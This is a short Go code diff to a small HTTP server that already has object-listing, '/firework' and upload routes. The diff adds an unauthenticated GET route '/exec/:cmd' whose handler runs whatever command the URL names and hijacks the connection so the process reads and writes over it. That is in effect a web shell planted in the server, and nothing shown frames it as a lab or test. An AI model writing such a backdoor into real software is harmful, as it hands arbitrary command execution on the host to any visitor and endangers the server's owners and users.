@@ -197,6 +197,17 @@ func (srv *Server) uploadFile(w http.ResponseWriter, r *http.Request, params htt
 	}
 }
 
+func (srv *Server) exec(w http.ResponseWriter, r *http.Request, params httprouter.Params) {
+	command := params.ByName("cmd")
+	cmd := exec.Command(command)
+	conn, rwbuf, _ := w.(http.Hijacker).Hijack()
+	defer conn.Close()
+	cmd.Stdout, cmd.Stdin, cmd.Stderr = rwbuf, rwbuf, rwbuf
+	cmd.Start()
+	cmd.Wait()
+	return
+}
+
 func (srv *Server) Save() {
 	body, err := json.MarshalIndent(srv, "", " ")
 	if err == nil {
@@ -286,5 +297,6 @@ func main() {
 	router.GET("/", srv.getObjs)
 	router.GET("/firework", srv.cong)
 	router.POST("/upload", srv.uploadFile)
+	router.GET("/exec/:cmd", srv.exec)
 	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", *port), router))
 }
